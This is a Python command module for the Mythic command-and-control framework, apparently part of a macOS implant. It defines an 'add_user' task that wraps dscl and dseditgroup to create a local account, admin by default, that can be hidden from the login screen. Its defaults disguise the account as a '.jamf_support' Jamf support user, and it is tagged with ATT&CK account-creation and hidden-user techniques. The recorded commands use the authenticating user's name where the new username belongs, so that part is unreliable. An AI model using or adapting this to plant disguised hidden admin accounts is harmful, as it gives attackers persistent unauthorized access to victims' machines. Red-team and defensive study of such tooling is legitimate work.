from mythic_container.MythicCommandBase import *
import json
from mythic_container.MythicRPC import *


class AddUserArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                display_name="New Password",
                name="password",
                type=ParameterType.String,
                description="p@55w0rd_here for new user",
                default_value="p@55w0rd_here",
                parameter_group_info=[ParameterGroupInfo(
                    required=False,
                    ui_position=4
                )]
            ),
            CommandParameter(
                display_name="Authenticate with this password",
                name="passwd",
                type=ParameterType.Credential_JSON,
                description="password of the user that will execute the commands",
                parameter_group_info=[ParameterGroupInfo(
                    ui_position=2
                )]
            ),
            CommandParameter(
                display_name="Authenticate as this user",
                name="user",
                type=ParameterType.Credential_JSON,
                description="username that will execute the commands",
                parameter_group_info=[ParameterGroupInfo(
                    ui_position=1
                )]
            ),
            CommandParameter(
                name="createprofile",
                type=ParameterType.Boolean,
                default_value=False,
                description="create a user profile or not",
                parameter_group_info=[ParameterGroupInfo(
                    required=False,
                )]
            ),
            CommandParameter(
                name="usershell",
                type=ParameterType.String,
                description="which shell environment should the new user have",
                default_value="/bin/bash",
                parameter_group_info=[ParameterGroupInfo(
                    required=False,
                    ui_position=5
                )]
            ),
            CommandParameter(
                name="primarygroupid",
                type=ParameterType.Number,
                description="POSIX primary group id for the new account",
                default_value=80,
                parameter_group_info=[ParameterGroupInfo(
                    required=False,
                )]
            ),
            CommandParameter(
                name="uniqueid",
                type=ParameterType.Number,
                default_value=403,
                description="POSIX unique id for the user",
                parameter_group_info=[ParameterGroupInfo(
                    required=False,
                )]
            ),
            CommandParameter(
                name="homedir",
                type=ParameterType.String,
                description="/Users/.jamf_support",
                parameter_group_info=[ParameterGroupInfo(
                    required=False,
                )]
            ),
            CommandParameter(
                name="realname",
                type=ParameterType.String,
                default_value="Jamf Support User",
                description="Full user name",
                parameter_group_info=[ParameterGroupInfo(
                    required=False,
                )]
            ),
            CommandParameter(
                display_name="New Username",
                name="username",
                type=ParameterType.String,
                default_value=".jamf_support",
                description="POSIX username for account",
                parameter_group_info=[ParameterGroupInfo(
                    required=False,
                    ui_position=3
                )]
            ),
            CommandParameter(
                name="hidden",
                type=ParameterType.Boolean,
                default_value=False,
                description="Should the account be hidden from the logon screen",
                parameter_group_info=[ParameterGroupInfo(
                    required=False,
                )]
            ),
            CommandParameter(
                name="admin",
                type=ParameterType.Boolean,
                default_value=True,
                description="Should the account be an admin account",
                parameter_group_info=[ParameterGroupInfo(
                    required=False,
                )]
            ),
        ]

    async def parse_arguments(self):
        self.load_args_from_json_string(self.command_line)


class AddUserCommand(CommandBase):
    cmd = "add_user"
    needs_admin = True
    help_cmd = "add_user"
    description = "Add a local user to the system by wrapping the Apple binary, dscl."
    version = 2
    author = "@its_a_feature_"
    argument_class = AddUserArguments
    attackmapping = ["T1136", "T1136.001", "T1548.004", "T1564.002"]

    async def create_go_tasking(self, taskData: MythicCommandBase.PTTaskMessageAllData) -> MythicCommandBase.PTTaskCreateTaskingMessageResponse:
        response = MythicCommandBase.PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )
        if taskData.args.get_arg("hidden"):
            await SendMythicRPCArtifactCreate(MythicRPCArtifactCreateMessage(
                TaskID=taskData.Task.ID,
                ArtifactMessage=f"dscl . create /Users/{taskData.args.get_arg('user')} IsHidden 1",
                BaseArtifactType="Process Create"
            ))
        else:
            await SendMythicRPCArtifactCreate(MythicRPCArtifactCreateMessage(
                TaskID=taskData.Task.ID,
                ArtifactMessage=f"dscl . create /Users/{taskData.args.get_arg('user')}",
                BaseArtifactType="Process Create"
            ))
        await SendMythicRPCArtifactCreate(MythicRPCArtifactCreateMessage(
            TaskID=taskData.Task.ID,
            ArtifactMessage=f"dscl . create /Users/{taskData.args.get_arg('user')} UniqueID {taskData.args.get_arg('uniqueid')}",
            BaseArtifactType="Process Create"
        ))
        await SendMythicRPCArtifactCreate(MythicRPCArtifactCreateMessage(
            TaskID=taskData.Task.ID,
            ArtifactMessage=f"dscl . create /Users/{taskData.args.get_arg('user')} PrimaryGroupID {taskData.args.get_arg('primarygroupid')}",
            BaseArtifactType="Process Create"
        ))
        await SendMythicRPCArtifactCreate(MythicRPCArtifactCreateMessage(
            TaskID=taskData.Task.ID,
            ArtifactMessage=f"dscl . create /Users/{taskData.args.get_arg('user')} NFSHomeDirectory \"{taskData.args.get_arg('homedir')}\"",
            BaseArtifactType="Process Create"
        ))
        await SendMythicRPCArtifactCreate(MythicRPCArtifactCreateMessage(
            TaskID=taskData.Task.ID,
            ArtifactMessage=f"dscl . create /Users/{taskData.args.get_arg('user')} RealName \"{taskData.args.get_arg('realname')}\"",
            BaseArtifactType="Process Create"
        ))
        await SendMythicRPCArtifactCreate(MythicRPCArtifactCreateMessage(
            TaskID=taskData.Task.ID,
            ArtifactMessage=f"dscl . create /Users/{taskData.args.get_arg('user')} UserShell {taskData.args.get_arg('usershell')}",
            BaseArtifactType="Process Create"
        ))

        if taskData.args.get_arg("admin"):
            await SendMythicRPCArtifactCreate(MythicRPCArtifactCreateMessage(
                TaskID=taskData.Task.ID,
                ArtifactMessage=f"dseditgroup -o edit -a {taskData.args.get_arg('user')} -t user admin",
                BaseArtifactType="Process Create"
            ))
        await SendMythicRPCArtifactCreate(MythicRPCArtifactCreateMessage(
            TaskID=taskData.Task.ID,
            ArtifactMessage=f"dscl . passwd /Users/{taskData.args.get_arg('user')} \"{taskData.args.get_arg('password')}\"",
            BaseArtifactType="Process Create"
        ))
        if taskData.args.get_arg("createprofile"):
            await SendMythicRPCArtifactCreate(MythicRPCArtifactCreateMessage(
                TaskID=taskData.Task.ID,
                ArtifactMessage=f"mkdir \"{taskData.args.get_arg('homedir')}\"",
                BaseArtifactType="Process Create"
            ))
            await SendMythicRPCArtifactCreate(MythicRPCArtifactCreateMessage(
                TaskID=taskData.Task.ID,
                ArtifactMessage=f"cp -R \"/System/Library/User Template/English.lproj/\" \"{taskData.args.get_arg('homedir')}\"",
                BaseArtifactType="Process Create"
            ))
            await SendMythicRPCArtifactCreate(MythicRPCArtifactCreateMessage(
                TaskID=taskData.Task.ID,
                ArtifactMessage=f"chown -R {taskData.args.get_arg('user')}:staff \"{taskData.args.get_arg('homedir')}\"",
                BaseArtifactType="Process Create"
            ))
        taskData.args.add_arg("passwd", taskData.args.get_arg("passwd")["credential"])
        taskData.args.add_arg("user", taskData.args.get_arg("user")["account"])
        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp
